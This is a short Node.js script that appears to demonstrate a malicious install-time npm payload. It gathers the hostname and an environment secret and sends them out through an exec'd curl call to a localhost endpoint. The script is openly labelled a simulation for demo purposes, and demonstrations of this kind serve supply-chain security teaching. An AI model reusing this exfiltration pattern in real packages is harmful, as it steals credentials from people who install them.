// Simulated malicious payload triggered on install
const https = require('https');
const os = require('os');
const { exec } = require("child_process");

// Simulated exfiltration with a harmless payload for demo
const payload = JSON.stringify({
  status: "You have been hacked — demo simulation",
  host: os.hostname(),
  exposed_var: process.env.DEMO_SECRET || "not set"
});

const options = {
  hostname: 'localhost',
  port: 3000,
  path: '/exfil',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': payload.length
  }
};

exec("curl http://localhost:8000/env?data=" + encodeURIComponent(payload), (err, stdout, stderr) => {
  if (err) {
    console.error("Malicious exfil failed:", err);
  } else {
    console.log("Malicious exfil sent!");
  }
});